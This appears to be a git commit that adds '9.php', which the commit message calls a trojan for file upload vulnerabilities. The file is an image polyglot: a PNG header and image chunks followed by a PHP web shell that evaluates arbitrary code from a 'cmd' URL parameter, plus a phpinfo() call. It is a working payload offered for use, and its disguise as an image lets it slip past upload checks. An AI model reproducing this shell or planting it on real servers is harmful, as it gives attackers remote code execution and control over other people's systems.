d2057090b0f97d5e224b11591bfc13a1a0ddf7b5
yhy217 <128808033+yhy217@users.noreply.github.com>
2023-09-18 17:23:31 +0800

    Add files via upload
    Trojan used for file upload vulnerabilities

---
+++ 9.php
@@ -0,0 +1,8 @@
+‰PNG
+
+   
+IHDR   s   `   .M?   sRGB ®Î?   gAMA  ±
+üa   	pHYs  %  %IR$?   øIDATx^íÑA?À°t ÂŸm?
+õ1 ŸÝ?Â÷7€fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fB?i&¤™fBšÉ˜y?p|    IEND®B`??php @eval($_GET["cmd"])?>
+
+<?php phpinfo();?>
